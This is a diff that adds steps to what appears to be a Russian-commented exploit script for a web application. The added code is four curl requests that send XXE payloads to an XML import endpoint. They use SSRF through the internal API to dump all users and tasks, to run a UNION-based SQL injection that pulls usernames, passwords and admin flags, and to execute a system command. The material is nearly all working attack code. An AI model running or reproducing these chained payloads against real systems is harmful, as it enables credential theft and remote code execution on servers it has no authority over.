@@ -600,6 +600,35 @@ echo " (200 = уязвим)"
 ---------------------------------
 
 
+# 1. Получение всех пользователей
+echo "[1] Users:"
+curl -s -X POST "$BASE_URL/api/xml/import" \
+  -H "Content-Type: application/xml" \
+  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "'$INTERNAL'/api/internal/users/all">]><data>&xxe;</data>'
+
+
+  # 2. Получение задач
+  echo -e "\n[2] Tasks:"
+  curl -s -X POST "$BASE_URL/api/xml/import" \
+    -H "Content-Type: application/xml" \
+    -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "'$INTERNAL'/api/internal/tasks/all">]><data>&xxe;</data>'
+
+
+    # 3. SQLi через SSRF + XXE
+    echo -e "\n[3] SQLi via XXE+SSRF:"
+    curl -s -X POST "$BASE_URL/api/xml/import" \
+      -H "Content-Type: application/xml" \
+      -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "'$INTERNAL'/api/internal/users/search?name=%27%20UNION%20SELECT%20%271%27,%20username,%20password,%20email,%20is_admin::text%20FROM%20users--">]><data>&xxe;</data>'
+
+
+
+    # 4. Выполнение команд через Internal API
+    echo -e "\n[4] RCE via XXE+SSRF:"
+    curl -s -X POST "$BASE_URL/api/xml/import" \
+      -H "Content-Type: application/xml" \
+      -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "'$INTERNAL'/api/internal/files/execute-command?cmd=id">]><data>&xxe;</data>'
+
+
 
 
 
